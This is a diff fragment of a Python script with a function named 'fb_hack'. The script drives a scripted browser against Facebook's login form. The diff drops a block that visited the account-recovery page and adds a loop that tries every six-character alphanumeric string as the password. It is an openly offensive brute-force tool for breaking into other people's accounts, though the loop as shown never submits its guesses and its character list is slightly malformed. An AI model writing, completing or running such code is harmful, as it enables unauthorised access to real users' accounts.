@@ -74,21 +74,12 @@ def fb_hack(email, codex, search):
   print(forms)"""
   browser.select_form(nr=0)
   browser.form['pass'] = str(1)
-  browser.click(nr=0)
-  browser.click(nr=0)
-  print(browser.geturl())
-  browser.open('https://www.facebook.com/recover/initiate/?is_from_lara_screen=1')
-  print(browser.geturl())
-  """browser.select_form(nr=0)
-  response1 = browser.response()
-  soup = BeautifulSoup(response1, 'html.parser')
-  with open("output1.html", "w") as file:
-    file.write(str(soup))
-  with open("output1.txt", "w") as file:
-    file.write(str(soup))
-  response1 = browser.response()
-  soup = BeautifulSoup(response1, 'html.parser')
-  print(soup.find_all(string=re.compile(search)))"""
+  browser.submit()
+  counter = 0
+  for combination in itertools.product([0,1,2,3,4,5,6,7,8,9,"a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","","X","Y","Z"], repeat=6):
+    browser.form['pass'] = (''.join(map(str, combination)))
+    counter += 1
+    print(int(counter), end='\r')
 
 os.system('clear')
 passcode6()
